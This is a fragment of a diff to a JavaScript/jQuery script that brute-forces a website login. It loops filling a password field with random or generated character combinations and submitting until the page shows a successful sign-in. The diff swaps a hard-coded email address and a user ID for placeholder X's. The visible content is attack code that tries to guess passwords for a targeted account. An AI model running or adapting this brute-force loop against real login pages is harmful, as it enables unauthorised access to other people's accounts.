@@ -1,4 +1,4 @@
-$('#userId1').val('akshayrathnavas@gmail.com')
+$('#userId1').val('XXXXXX')
 var chars = ["a","b","c","d","e","f","g","h","i","j,","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," ","9","R","K","S","A","Y","@"];
 while($('#logInUN').text() == "My Account"){
   var len = Math.floor(Math.random() * 20);
@@ -43,7 +43,7 @@ var combinations = getCombinations(["a", "b", "c", "d", "e", "f", "g", "h", "i",
 	}
 
 	function bruteForce(input){
-	$('#userId1').val('C17A1192')
+	$('#userId1').val('XXXXXXX')
 	while($('#logInUN').text() == "My Account"){
 	  $("#userPass1").val(input);
 		validateUser();
